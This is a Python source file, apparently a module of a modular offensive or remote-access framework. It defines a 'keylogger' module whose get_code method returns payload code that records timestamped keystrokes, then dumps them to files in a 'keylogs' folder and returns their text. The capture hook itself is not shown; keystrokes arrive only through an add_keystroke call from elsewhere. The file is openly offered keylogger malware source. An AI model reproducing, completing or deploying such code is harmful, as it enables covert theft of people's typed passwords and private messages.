from .base import BaseModule

class KeyloggerModule(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "keylogger"
        self.description = "Capture keystrokes"
        self.author = "admin"
        self.version = "1.0"
        
    def get_code(self):
        return '''
import threading
import os
from datetime import datetime

class Keylogger:
    def __init__(self):
        self.log = []
        self.running = False
        self._lock = threading.Lock()
        
    def start(self):
        if not self.running:
            self.running = True
            self.log = []
            return True
        return False
        
    def stop(self):
        if self.running:
            self.running = False
            return True
        return False
        
    def add_keystroke(self, key):
        if self.running:
            with self._lock:
                self.log.append((datetime.now(), key))
                
    def get_log(self):
        with self._lock:
            return self.log.copy()

_keylogger = None

def start_keylogger():
    global _keylogger
    _keylogger = Keylogger()
    return _keylogger.start()

def stop_keylogger():
    global _keylogger
    if _keylogger:
        return _keylogger.stop()
    return False

def dump_logs():
    global _keylogger
    if _keylogger:
        logs = _keylogger.get_log()
        if logs:
            log_text = "\\n".join(f"{ts}: {key}" for ts, key in logs)
            
            os.makedirs('keylogs', exist_ok=True)
            filename = os.path.join('keylogs', f'keylog-{datetime.now().strftime("%Y%m%d-%H%M%S")}.txt')
            with open(filename, 'w') as f:
                f.write(log_text)
                
            return f"Keylog saved to {filename}\\n{log_text}"
    return "No logs available"
''' 